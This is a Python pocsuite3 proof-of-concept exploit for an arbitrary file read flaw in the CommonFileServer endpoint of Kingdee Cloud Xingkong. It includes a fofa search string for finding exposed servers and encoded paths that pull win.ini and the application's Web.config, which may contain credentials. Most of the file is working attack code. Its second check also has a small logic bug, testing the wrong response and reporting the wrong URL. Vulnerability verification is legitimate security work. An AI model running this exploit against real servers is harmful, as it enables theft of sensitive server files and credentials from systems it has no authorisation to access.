#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64,json
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-08-15'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-08-15'  # 编写 PoC 的日期
    updateDate = '2023-08-15'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        fofa:app="金蝶云星空-管理中心"
        金蝶OA 云星空 CommonFileServer接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件，进一步攻击服务器
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        path ='/CommonFileServer/c%3a%2fwindows%2fwin.ini'  
        path_2 ='/CommonFileServer/C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config'  
        headers={
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        try:
            resq  = requests.get(url=self.url+path,headers=headers,timeout=5)
            if resq.status_code == 200 and ("fonts" in resq.text or "MAPI=1" in resq.text):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + path
            else:
                resq_2 = requests.get(url=self.url+path_2,headers=headers,timeout=5)
                if resq.status_code == 200 and "?xml version=" in resq_2.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url + path           
        except Exception as e:
            return
        return self.parse_output(result)         

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)